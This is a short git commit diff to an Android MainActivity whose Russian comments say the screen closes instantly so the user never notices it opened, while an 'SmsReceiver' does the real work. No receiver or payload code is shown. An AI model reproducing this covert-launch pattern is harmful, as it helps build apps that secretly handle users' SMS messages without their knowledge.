815979e8572ae7231aa1ce3915c1d75a4e68f979
MintOrbit <168619262+MintOrbit@users.noreply.github.com>
2026-04-10 10:22:32 +0300

    Update MainActivity.java

--- app/src/main/java/com/sys/sync/MainActivity.java
+++ app/src/main/java/com/sys/sync/MainActivity.java
@@ -7,8 +7,7 @@ public class MainActivity extends Activity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        // Оно просто запускается и закрывается за 0.1 сек.
-        // Юзер даже не поймет, что что-то открылось.
+        // Сразу закрываемся, работу сделает SmsReceiver
         finish();
     }
 }
